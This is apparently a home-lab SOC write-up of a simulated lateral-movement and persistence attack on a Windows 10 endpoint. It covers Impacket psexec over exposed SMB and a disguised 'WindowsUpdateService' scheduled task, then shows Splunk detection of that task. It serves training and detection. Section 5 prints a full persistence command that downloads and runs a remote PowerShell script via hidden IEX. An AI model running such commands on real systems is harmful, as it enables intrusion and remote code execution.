# Attack 2: Endpoint Persistence (Remote Scheduled Task)

## 📋 Incident Overview
*   **Tool:** Impacket (`psexec`), Nmap, `schtasks.exe`
*   **MITRE ATT&CK ID:** [T1053.005 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/005/)
*   **Target:** Windows 10 Endpoint (`192.168.1.30`) via pfSense WAN (`192.168.80.133`)
*   **Severity:** Critical (Post-exploitation / Persistence)
*   **Attacker IP:** `192.168.80.1` (Kali Linux)

---

## 1. The Scenario & Reconnaissance
After compromising the `Administrator` credentials (via the RDP brute force), the attacker scanned the pfSense WAN IP to find a path for lateral movement. Nmap revealed that SMB (Port 445) was exposed.

<p align="center">
<img width="758" height="308" alt="nmap scan" src="https://github.com/user-attachments/assets/705638b1-4944-4d83-b221-fd0fc4df2539" />
  <br>
  <i>Figure 1: Nmap scan revealing exposed RDP (3389) and SMB (445) ports</i>
</p>

---

## 2. The Payload & C2 Infrastructure
Before executing the attack, the attacker hosted a malicious PowerShell script (`evil.ps1`) on the Kali Linux machine using a simple Python HTTP server (`python3 -m http.server 80`). The goal was to establish a Command & Control (C2) callback, forcing the Windows 10 endpoint to download and execute the payload from `http://192.168.80.128/evil.ps1`.

---

## 3. Attack Execution & Defense in Depth
The attacker used `impacket-psexec` to connect to the exposed SMB port and execute the payload as `NT AUTHORITY\SYSTEM`.

### 🛡️ Windows Defender Intervention
During the first attempt, **Windows Defender successfully detected and quarantined the psexec payload** (`VirTool:Win32/RemoteExec!pz`). This is a massive win for endpoint defense, proving that the AV is actively blocking lateral movement tools. 

*(Note: To successfully generate the SIEM telemetry for this SOC investigation, Windows Defender was temporarily disabled to allow the remote execution to complete).*

<p align="center">
<img width="1114" height="352" alt="impacket command" src="https://github.com/user-attachments/assets/a817e6ce-ccbf-4aee-873a-d38a73fab70a" />
  <br>
  <i>Figure 2: Impacket psexec successfully creating the remote scheduled task</i>
</p>

---

## 4. Proof of Execution (Task Scheduler)
The attack succeeded. The attacker established persistence by creating a task named `WindowsUpdateService` that triggers at system startup.

<p align="center">
<img width="1116" height="656" alt="WindowsUpdateService task scheduler" src="https://github.com/user-attachments/assets/b9dab631-9bcb-4139-9d11-311a2acfbee5" />
  <br>
  <i>Figure 3: Windows Task Scheduler showing the malicious task created by the attacker</i>
</p>

---

## 5. SIEM Detection & Threat Hunting
Because the Universal Forwarder is configured to ship raw XML (`renderXml = true`), the SOC Analyst must use SPL `rex` commands to parse the data and extract the Indicators of Compromise (IoCs). 

### The Detection Query
We hunted for `schtasks.exe` spawning a `powershell.exe` process, and extracted the exact command line to confirm the malicious payload.

```splunk
index=winlog_clients "*schtasks.exe*" "*powershell.exe*"
| rex field=_raw "<Data Name='CommandLine'>(?<CommandLine>[^<]+)"
| rex field=_raw "<Data Name='ParentImage'>(?<ParentImage>[^<]+)"
| table _time, host, ParentImage, CommandLine
```

<p align="center">
<img width="1327" height="418" alt="Splunk log 2" src="https://github.com/user-attachments/assets/113ae9b1-2a75-4c79-b3db-cda73f0f3949" />
  <br>
  <i>Figure 4: Splunk extraction revealing the hidden PowerShell payload and C2 IP</i>
</p>

### Analyst Breakdown of the Telemetry:
Looking at the extracted table, we can definitively prove the compromise:
*   **`ParentImage`**: `C:\Windows\XLoDyVd.exe` (The random name proves this is the temporary psexec service).
*   **`CommandLine`**: `schtasks /create /tn WindowsUpdateService /tr "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.128/evil.ps1')"` 

---

## 6. Reporting & Lessons Learned
*   **The Outcome:** The attacker successfully executed a remote command and established persistence. 
*   **Security Gap Identified:** SMB (Port 445) should **never** be exposed directly to the WAN. Furthermore, local administrator accounts should not be reused across environments.
*   **SOC Engineering Note:** While Windows Defender blocked the initial execution, the attacker bypassed it. This highlights the importance of having **multiple layers of defense (Defense in Depth)**. Even if AV fails, Sysmon and Splunk provide the visibility required to detect the persistence mechanism.
